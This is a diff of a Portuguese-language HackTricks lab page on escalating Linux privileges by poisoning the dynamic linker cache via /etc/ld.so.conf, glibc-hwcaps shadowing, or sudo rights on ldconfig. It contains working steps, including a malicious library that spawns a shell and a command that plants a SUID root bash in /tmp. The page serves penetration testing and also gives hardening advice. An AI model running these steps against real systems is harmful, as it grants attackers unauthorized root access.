@@ -1,10 +1,12 @@
 # Exemplo de exploit de privesc do ld.so
 
-Esta página é um laboratório focado no poisoning do **cache do system linker por meio de `/etc/ld.so.conf` ou `ldconfig`**. Para injeção de bibliotecas ausentes, `RPATH`/`RUNPATH` com permissão de escrita, `LD_PRELOAD` e outros abusos genéricos de linker em SUID, consulte [Abuso de Shared Library e Linker em SUID](suid-shared-library-and-linker-abuse.md).
+{{#include ../../banners/hacktricks-training.md}}
 
-## Prepare o ambiente
+Esta página é um laboratório focado em envenenar o **cache do linker do sistema por meio de `/etc/ld.so.conf` ou `ldconfig`**. Para injeção de bibliotecas ausentes, `RPATH`/`RUNPATH` gravável, `LD_PRELOAD` e outros abusos genéricos de linker com SUID, consulte [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).
 
-Na seção a seguir, você encontra o código dos arquivos que usaremos para preparar o ambiente.
+## Preparar o ambiente
+
+Na seção a seguir, você pode encontrar o código dos arquivos que usaremos para preparar o ambiente
 
 {{#tabs}}
 {{#tab name="sharedvuln.c"}}
@@ -40,10 +42,10 @@ puts("Hi");
 {{#endtab}}
 {{#endtabs}}
 
-1. **Crie** esses arquivos na sua máquina na mesma pasta
-2. **Compile** a **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Copie** `libcustom.so` para `/usr/lib` e atualize o cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
-4. **Compile** o **executável**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+1. **Crie** esses arquivos na sua máquina, na mesma pasta
+2. **Compile a** **biblioteca**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
+3. **Copie** `libcustom.so` para `/usr/lib` e atualize o cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilégios de root)
+4. **Compile o** **executável**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
 ### Verifique o ambiente
 
@@ -61,7 +63,7 @@ Hi
 ```
 ### Comandos úteis de triagem
 
-Ao atacar um alvo real, verifique o **nome exato da biblioteca** de que o binário precisa, o que o **loader está resolvendo atualmente** e quais caminhos configurados podem ser gravados sem modificar o cache ativo.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
+Ao atacar um alvo real, verifique o **nome exato da biblioteca** de que o binário precisa, o que o loader está **resolvendo atualmente** e quais caminhos configurados podem ser gravados sem modificar o cache ativo.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
 ```bash
 # Needed SONAME and program interpreter
 readelf -d ./sharedvuln | grep NEEDED
@@ -80,37 +82,39 @@ namei -l /home/ubuntu/lib
 # Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
 /sbin/ldconfig -N -X -v 2>/dev/null
 ```
-Use `ldd` apenas em um executável **confiável**. Algumas implementações ou interpretadores ELF incomuns podem fazer com que ele execute código controlado pelo atacante; `objdump -p ./file | grep NEEDED` lista com segurança as dependências diretas. Para um alvo confiável, invocar o interpretador descoberto com `--list` mostra a resolução real.<sup>[[4]](#references)</sup>
+Use `ldd` somente em um executável **confiável**. Algumas implementações ou interpretadores ELF incomuns podem fazer com que ele execute código controlado pelo atacante; `objdump -p ./file | grep NEEDED` lista com segurança as dependências diretas. Para um alvo confiável, invocar o interpretador descoberto com `--list` mostra a resolução real.<sup>[[4]](#references)</sup>
 
-Alguns gotchas úteis:
+Alguns pontos importantes:
 
-- `sudo echo ... > /etc/ld.so.conf.d/x.conf` geralmente **não funciona** porque o redirecionamento é feito pelo seu shell atual. Use
-`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` em vez disso.
-- Binários **SUID/privilegiados** são executados no **secure-execution mode**: `LD_LIBRARY_PATH`
+- `sudo echo ... > /etc/ld.so.conf.d/x.conf` normalmente **não funciona**, porque
+o redirecionamento é feito pelo seu shell atual. Em vez disso, use
+`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
+- Binários **SUID/privileged** são executados no **secure-execution mode**: `LD_LIBRARY_PATH`
 é ignorado, enquanto `LD_PRELOAD` é restrito (nomes que contêm barras são
-ignorados, e apenas libraries marcadas como setuid em diretórios padrão podem ser
-preloaded). Quando o root executa `ldconfig`, os diretórios listados em
-`/etc/ld.so.conf` podem entrar em `/etc/ld.so.cache`, portanto essa misconfiguração ainda pode
-afetar programas privilegiados.<sup>[[1]](#references)[[2]](#references)</sup>
-- `LD_DEBUG` também é ignorado no secure-execution mode, a menos que `/etc/suid-debug` exista; portanto, colete seu trace a partir de uma execução não-SUID equivalente, em vez de esperar uma saída da execução privilegiada.<sup>[[1]](#references)</sup>
+ignorados, e somente libraries marcadas como setuid em diretórios padrão podem ser
+preloaded). Quando root executa `ldconfig`, os diretórios listados em
+`/etc/ld.so.conf` podem entrar em `/etc/ld.so.cache`; portanto, essa
+misconfiguration ainda pode afetar programas privilegiados.<sup>[[1]](#references)[[2]](#references)</sup>
+- `LD_DEBUG` também é ignorado no secure-execution mode, a menos que `/etc/suid-debug` exista; portanto, colete o trace a partir de uma execução não-SUID equivalente, em vez de esperar uma saída da execução privilegiada.<sup>[[1]](#references)</sup>
 - No glibc 2.33 e versões mais recentes, o dynamic loader também expõe
-`--list-diagnostics`, que exibe diagnósticos legíveis por máquina e informações sobre os search paths integrados quando um hijack não se comporta como esperado.<sup>[[1]](#references)[[6]](#references)</sup>
+`--list-diagnostics`, que imprime diagnósticos legíveis por máquinas e informações
+sobre os search paths integrados quando um hijack não se comporta como esperado.<sup>[[1]](#references)[[6]](#references)</sup>
 
-### Restrições de cache e SONAME
+### Cache e restrições de SONAME
 
-`ldconfig` não armazena em cache qualquer arquivo arbitrário em um diretório configurado: ele examina os headers ELF, reconhece nomes correspondentes a `lib*.so*` ou `ld-*.so*` e espera a cadeia convencional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Portanto, o objeto injetado precisa ter a architecture/class do alvo, o nome exato de `DT_NEEDED` (normalmente seu `DT_SONAME`) e quaisquer símbolos/versões que o victim resolva.<sup>[[2]](#references)</sup>
+`ldconfig` não armazena em cache todo arquivo arbitrário em um diretório configurado: ele examina cabeçalhos ELF, reconhece nomes correspondentes a `lib*.so*` ou `ld-*.so*` e espera a cadeia convencional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Portanto, o objeto injetado deve ter a arquitetura/class do alvo, o nome exato de `DT_NEEDED` (normalmente seu `DT_SONAME`) e quaisquer símbolos/versões que a vítima resolva.<sup>[[2]](#references)</sup>
 ```bash
 readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
 readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
 readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
 ldconfig -p | grep -F 'libcustom.so'
 ```
-Prefira uma library específica para o target, como neste exemplo. Fazer shadowing de um SONAME comum com um objeto incompleto pode interromper todos os processos que o resolvem antes que o target privilegiado seja executado.<sup>[[3]](#references)</sup>
+Prefira uma library específica para o target, como neste exemplo. Fazer shadowing de um SONAME comum com um objeto incompleto pode interromper todos os processos que o resolvem antes que o target privilegiado pretendido seja executado.<sup>[[3]](#references)</sup>
 
-## Exploração
+## Exploit
 
 Neste cenário, suponha que um administrador tenha adicionado uma entrada vulnerável a um
-arquivo em `/etc/ld.so.conf.d/` que é incluído pelo
+arquivo em `/etc/ld.so.conf.d/` incluído pelo
 `/etc/ld.so.conf` do sistema.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
@@ -132,13 +136,13 @@ puts("I'm the bad library");
 system("/bin/sh");
 }
 ```
-Se você espera que o **root** (ou outra conta privilegiada) execute o binário vulnerável posteriormente, geralmente é melhor deixar um **artefato pertencente ao root** em vez de iniciar um shell interativo. Por exemplo:
+Se você espera que **root** (ou outra conta privilegiada) execute o binário vulnerável posteriormente, geralmente é melhor deixar um **artefato pertencente a root** em vez de iniciar um shell interativo. Por exemplo:
 ```c
 system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
 ```
-Depois que a execução privilegiada ocorrer, você poderá usar `/tmp/rootbash -p`.
+Então, após a execução privilegiada ocorrer, você pode usar `/tmp/rootbash -p`.
 
-Agora que **criamos a biblioteca maliciosa libcustom dentro do** caminho configurado incorretamente, o cache padrão deverá ser reconstruído por uma execução privilegiada bem-sucedida do **`ldconfig`**. Uma reinicialização ajuda apenas quando o processo de inicialização local realmente o executa; caso contrário, aguarde uma ação do administrador ou use uma regra insegura do sudo, se houver uma disponível.<sup>[[2]](#references)</sup>
+Agora que **criamos a biblioteca libcustom maliciosa dentro do** caminho configurado incorretamente, o cache padrão deve ser reconstruído por uma execução privilegiada bem-sucedida do **`ldconfig`**. Uma reinicialização ajuda apenas quando o processo de inicialização local realmente o executa; caso contrário, aguarde uma ação do administrador ou use uma regra sudo insegura, se houver uma disponível.<sup>[[2]](#references)</sup>
 
 Depois que isso acontecer, **verifique novamente** de onde o executável `sharedvuln` está carregando a biblioteca `libcustom.so`:
 ```c
@@ -157,11 +161,11 @@ $ whoami
 ubuntu
 ```
 > [!TIP]
-> Observe que neste exemplo não escalamos privilégios, mas, modificando os comandos executados e **aguardando que o root ou outro usuário privilegiado execute o binário vulnerável**, conseguiremos escalar privilégios.
+> Observe que, neste exemplo, não escalamos privilégios, mas, modificando os comandos executados e **aguardando que o root ou outro usuário privilegiado execute o binário vulnerável**, poderemos escalar privilégios.
 
-### Modern `glibc-hwcaps` shadowing
+### Shadowing moderno de `glibc-hwcaps`
 
-Desde o glibc 2.33, o loader pode preferir bibliotecas otimizadas abaixo de `glibc-hwcaps/<level>/` dentro de **cada diretório de pesquisa de bibliotecas**. Consequentemente, verificar apenas `/home/ubuntu/lib` é insuficiente: um subdiretório compatível com permissão de escrita, como `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, pode fazer shadowing da biblioteca base depois que o `ldconfig` a indexar, enquanto outras CPUs continuam usando o objeto base. Isso também fornece um hijack seletivo por arquitetura, que pode não ser detectado quando a validação ocorre em uma CPU diferente.<sup>[[1]](#references)[[3]](#references)</sup>
+Desde a glibc 2.33, o loader pode preferir bibliotecas otimizadas em `glibc-hwcaps/<level>/` dentro de **cada diretório de busca de bibliotecas**. Consequentemente, verificar apenas `/home/ubuntu/lib` é insuficiente: um subdiretório compatível e gravável, como `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, pode fazer shadowing da biblioteca base depois que o `ldconfig` a indexar, enquanto outras CPUs continuam usando o objeto base. Isso também fornece um hijack seletivo por arquitetura, que pode passar despercebido quando a validação ocorre em uma CPU diferente.<sup>[[1]](#references)[[3]](#references)</sup>
 ```bash
 # The loader prints the supported levels in priority order
 "$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
@@ -175,17 +179,17 @@ sudo ldconfig
 ldconfig -p | grep -F libcustom.so
 "$interp" --list ./sharedvuln | grep -F libcustom.so
 ```
-As orientações atuais de hardening do glibc recomendam evitar SONAMEs duplicados, locais de pesquisa não padrão e objetos em subdiretórios `glibc-hwcaps`. Do ponto de vista de auditoria, aplique recursivamente verificações de ownership e writeability aos diretórios configurados e aos componentes do caminho pai.<sup>[[3]](#references)</sup>
+As orientações atuais de hardening do glibc recomendam evitar SONAMEs duplicados, locais de busca não padrão e objetos em subdiretórios `glibc-hwcaps`. Do ponto de vista de auditoria, aplique recursivamente verificações de propriedade e permissões de escrita aos diretórios configurados e aos componentes do caminho pai.<sup>[[3]](#references)</sup>
 
-### Outras misconfigurations - Same vuln
+### Outras configurações incorretas - Mesma vulnerabilidade
 
-No exemplo anterior, simulamos uma misconfiguration em que um administrador **definiu uma pasta não privilegiada dentro de um arquivo de configuração em `/etc/ld.so.conf.d/`**.\
-Mas existem outras misconfigurations que podem causar a mesma vulnerabilidade: se você tiver **permissões de escrita** em um **arquivo de configuração** carregado, puder criar um arquivo em um diretório `/etc/ld.so.conf.d/` gravável ou puder escrever em `/etc/ld.so.conf`, poderá configurar e explorar a mesma vulnerabilidade.<sup>[[1]](#references)[[2]](#references)</sup>
+No exemplo anterior, simulamos uma configuração incorreta na qual um administrador **definiu uma pasta sem privilégios dentro de um arquivo de configuração em `/etc/ld.so.conf.d/`**.\
+Mas existem outras configurações incorretas que podem causar a mesma vulnerabilidade: se você tiver **permissões de escrita** em um **arquivo de configuração** carregado, puder criar um arquivo em um diretório `/etc/ld.so.conf.d/` com permissão de escrita ou puder escrever em `/etc/ld.so.conf`, poderá configurar e explorar a mesma vulnerabilidade.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ## Exploit 2
 
 **Suponha que você tenha privilégios sudo sobre `ldconfig`**.\
-Você pode indicar ao `ldconfig` **qual arquivo de configuração ler** com `-f`, portanto, um arquivo que nomeie diretórios controlados pelo atacante pode fazer o `ldconfig` adicionar essas pastas ao cache.<sup>[[2]](#references)</sup>\
+Você pode indicar ao `ldconfig` **qual arquivo de configuração ler** usando `-f`; portanto, um arquivo que especifique diretórios controlados pelo atacante pode fazer com que o `ldconfig` adicione essas pastas ao cache.<sup>[[2]](#references)</sup>\
 Então, vamos criar os arquivos e pastas necessários para carregar "/tmp":
 ```bash
 cd /tmp
@@ -194,7 +198,7 @@ echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
 Agora, conforme indicado no **exploit anterior**, **crie a biblioteca maliciosa dentro de `/tmp`**.\
-E, por fim, vamos carregar o caminho e verificar de onde o binário está carregando a biblioteca:
+E, finalmente, vamos carregar o path e verificar de onde o binário está carregando a biblioteca:
 ```bash
 # -f changes the input configuration; the default output is still /etc/ld.so.cache
 sudo ldconfig -f fake.ld.so.conf
@@ -205,7 +209,7 @@ libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-**Como você pode ver, tendo privilégios de sudo sobre `ldconfig`, você pode explorar a mesma vulnerabilidade.** Os detalhes das opções são importantes ao avaliar uma regra de sudo restrita: `-f` seleciona outra configuração, mas ainda reconstrói `/etc/ld.so.cache`; `-C` redireciona o cache para outro local; `-N` impede a reconstrução do cache; e `-X` impede as atualizações de links, mas **ainda reconstrói o cache, a menos que seja combinado com `-N`**.<sup>[[2]](#references)</sup>
+**Como você pode ver, tendo privilégios sudo sobre `ldconfig`, é possível explorar a mesma vulnerabilidade.** Os detalhes das opções são importantes ao avaliar uma regra sudo restrita: `-f` seleciona outra configuração, mas ainda reconstrói `/etc/ld.so.cache`; `-C` redireciona o cache para outro local; `-N` impede a reconstrução do cache; e `-X` impede as atualizações de links, mas **ainda reconstrói o cache, a menos que seja combinado com `-N`**.<sup>[[2]](#references)</sup>
 
 
 
